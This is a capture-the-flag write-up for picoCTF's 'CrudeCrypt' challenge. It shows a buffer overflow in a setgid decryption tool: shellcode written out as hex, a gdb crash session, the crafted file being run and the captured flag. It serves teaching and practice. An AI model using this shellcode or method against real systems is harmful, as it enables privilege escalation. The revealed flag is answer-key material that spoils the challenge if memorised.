CrudeCrypt - 180
================

### Desc:
Without proper maintainers, development of Truecrypt has stopped! CrudeCrypt has emerged as a notable alternative in the open source community. The author has promised it is 'secure' but we know better than that. Take a look at the code and read the contents of flag.txt from the server! The problem is at /home/crudecrypt/crude_crypt on the shell server.

### Hint:
You can never trust user input!

### Getting the flag:

```
$ echo -ne '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xd2\x52\x53\x89\xe1\xcd\x80' > raw.txt
$ gcc -ocrude_crypt2 crude_crypt2.c -lcrypto -lmcrypt

(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/crudecrypt/crude_crypt decrypt enc.txt raw.txt
-=- Welcome to CrudeCrypt 0.1 Beta -=-
-> File password: foobar


Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/x $esp
0xffffd630:	0x90909090

$ ./crude_crypt2 raw.txt enc.txt
$ scp enc.txt pico22418@shell2014.picoctf.com:/tmp/sigsegv
$ /home/crudecrypt/crude_crypt decrypt enc.txt raw.txt
-=- Welcome to CrudeCrypt 0.1 Beta -=-
-> File password: foobar

$ id
uid=13315(pico22418) gid=1017(picogroup) egid=1012(crudecrypt) groups=1017(picogroup)
$ cat /home/crudecrypt/flag.txt
writing_software_is_hard
```

